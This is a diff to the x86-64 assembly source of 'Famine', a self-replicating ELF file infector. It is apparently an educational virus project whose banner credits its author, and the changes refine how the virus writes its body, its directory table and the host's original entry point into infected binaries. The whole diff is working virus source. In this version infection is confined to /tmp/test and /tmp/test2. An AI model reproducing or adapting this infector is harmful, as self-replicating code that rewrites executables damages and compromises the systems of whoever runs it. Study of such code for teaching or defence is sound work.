@@ -30,6 +30,11 @@ dir_loop:
 	mov		rdi, QWORD [rdi + rax * 8]
 	cmp		rdi, 0
 	je		famine64_end
+	cmp		QWORD [rel jump_offset], 0
+	je		dir_call
+	lea		rax, [rel famine64_func]
+	add		rdi, rax
+dir_call:
 	call	find_files
 	add		QWORD [rsp], 0x1
 	jmp		dir_loop
@@ -332,7 +337,7 @@ check_end:
 ;;                                                                           ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 infect_file:
-	sub		rsp, 96
+	sub		rsp, 112
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; Elf64_Phdr *program, Elf64_Phdr *iprogram, Elf64_Shdr *section,
 	;; [rsp]              , [rsp + 8]           , [rsp + 16]         ,
@@ -637,11 +642,57 @@ infect_write:
 	mov		rax, SYS_WRITE
 	syscall
 	mov		rdx, QWORD [rel famine64_size]
-	sub		rdx, 8
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; Loop through dir_all to calculate the number of directories offset    ;;
+	;; we will rewrite.                                                      ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		DWORD [rsp + 92], 0
+	xor		rax, rax
+dir_nb:
+	sub		rdx, 8							; size of 64 bit address
+	mov		eax, DWORD [rsp + 92]
+	lea		rsi, [rel dir_all]
+	mov		rsi, QWORD [rsi + rax * 8]
+	add		DWORD [rsp + 92], 1
+	cmp		rsi, 0
+	jne		dir_nb
+	sub		rdx, 8							; jump_offset size
 	lea		rsi, [rel famine64_func]		; famine64_func
 	mov		edi, DWORD [rsp + 64]			; int fd
 	mov		rax, SYS_WRITE
 	syscall
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; Loop through dir_all to write the offset of the directories           ;;
+	;; we will rewrite.                                                      ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		DWORD [rsp + 92], 0
+write_dir:
+	mov		rdx, 8							; 64 bit address size
+	xor		rax, rax
+	mov		eax, DWORD [rsp + 92]
+	lea		rsi, [rel dir_all]
+	mov		rsi, QWORD [rsi + rax * 8]
+	cmp		rsi, 0
+	je		write_dir_end
+	lea		rax, [rel famine64_func]
+	sub		rsi, rax
+	mov		QWORD [rsp + 96], rsi
+	lea		rsi, [rsp + 96]
+	mov		edi, DWORD [rsp + 64]
+	mov		rax, SYS_WRITE
+	syscall
+	add		DWORD [rsp + 92], 1
+	jmp		write_dir
+write_dir_end:
+	mov		QWORD [rsp + 92], 0
+	mov		rdx, 8
+	lea		rsi, [rsp + 92]
+	mov		edi, DWORD [rsp + 64]
+	mov		rax, SYS_WRITE
+	syscall
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; Write the original program entry point offset                         ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		rdx, 8							; sizeof(old_entry)
 	lea		rsi, [rsp + 76]					; old_entry
 	mov		edi, DWORD [rsp + 64]			; int fd
@@ -654,9 +705,14 @@ infect_write:
 	add		rax, 8							; add famine64_signature size
 	cmp		QWORD [rsp + 84], rax			; padding == psize ?
 	je		off_add
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; int zero                                                              ;;
+	;; [rsp + 92]
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	mov		BYTE [rsp + 92], 0
 add_padding:
 	mov		rdx, 1
-	lea		rsi, [rel zero]					; '\0'
+	lea		rsi, [rsp + 92]
 	mov		edi, DWORD [rsp + 64]			; int fd
 	mov		rax, SYS_WRITE
 	syscall
@@ -681,7 +737,7 @@ infect_write_end:
 	mov		rax, SYS_CLOSE
 	syscall
 infect_file_end:
-	add		rsp, 96
+	add		rsp, 112
 	ret
 	
 famine64_end:
@@ -697,15 +753,13 @@ do_ret:
 	add		rsp, 0x10
 	pop		rdi
 	pop		rax
-;	mov		QWORD [rel jump_offset], 0
 	ret
 
 data:
-	zero db 0x0
 	famine64_size dq end_of_file - famine64_func
 	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
 	dir_all dq dir_one, dir_two, 0
-	jump_offset dq 0x00000000
+	jump_offset dq 0
 end_of_file:
